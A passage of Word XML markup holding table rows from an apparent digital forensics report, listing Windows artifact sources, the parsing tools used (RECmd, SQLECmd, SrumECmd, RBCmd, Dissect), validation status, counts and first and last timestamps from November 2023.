              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:13.620546</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:57.541187</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: USB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:09.372752</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:40:19.244013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Firefox browser (form history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SQLECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:39:39</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:38:42</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: Products (MSI)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:14:02.428574</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:29:29.888889</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: RecentDocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:50:32.262308</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:32:08.503524</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network connections)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (downloads, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.882523</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:38:52.452000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: SCSI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:07.326300</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:40:19.728426</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (push notifications)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:10:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:55:43.891255</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.391791</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Firefox browser (downloads)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SQLECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:47:15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:38:52</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MRU OpenSave (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556810</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556810</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Recycle Bin (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:20.820000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:56:07.136999</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Recycle Bin ($I)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RBCmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:56:07</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AppInit_DLLs (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:55:43.766245</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:12.323683</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: known networks</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2023-11-09 19:00:26.938000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:07:13.338000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: OpenSavePidlMRU</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2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: VolumeInfoCache</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2023-11-09 11:02:48.151313</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:45:49.033342</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: RADAR (memory leaks)</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2023-11-10 10:30:34.478433</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:40:34.490348</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Internet Explorer / WebCache (downloads)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
